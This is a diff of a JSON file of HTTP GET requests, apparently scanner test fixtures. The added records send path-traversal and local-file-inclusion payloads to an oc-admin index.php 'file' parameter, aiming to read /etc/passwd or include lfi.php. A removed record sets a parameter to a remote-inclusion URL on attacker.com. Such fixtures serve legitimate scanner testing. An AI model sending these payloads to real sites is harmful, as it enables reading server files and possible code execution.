@@ -1,17 +1,61 @@
 [
   {
-    "url": "http://bm1.com/case1/bm.php", 
-    "action": "http://bm1.com/case1/bm.php", 
+    "url": "https://app7.com/oc-admin/", 
+    "action": "https://app7.com/oc-admin/index.php", 
     "parameter": {
-      "q": "http://attacker.com/a"
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../../etc/passwd"
     }, 
     "method": "get"
   }, 
   {
-    "url": "http://bm1.com/case1/bm.php", 
-    "action": "http://bm1.com/case1/bm.php", 
+    "url": "https://app7.com/oc-admin/", 
+    "action": "https://app7.com/oc-admin/index.php", 
     "parameter": {
-      "q": "../../../../../../../../../../../../../../lfi"
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app7.com/oc-admin/", 
+    "action": "https://app7.com/oc-admin/index.php", 
+    "parameter": {
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app7.com/oc-admin/index.php", 
+    "action": "https://app7.com/oc-admin/index.php", 
+    "parameter": {
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../../etc/passwd"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app7.com/oc-admin/index.php", 
+    "action": "https://app7.com/oc-admin/index.php", 
+    "parameter": {
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app7.com/oc-admin/index.php", 
+    "action": "https://app7.com/oc-admin/index.php", 
+    "parameter": {
+      "action": "render", 
+      "page": "appearance", 
+      "file": "../../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
   }
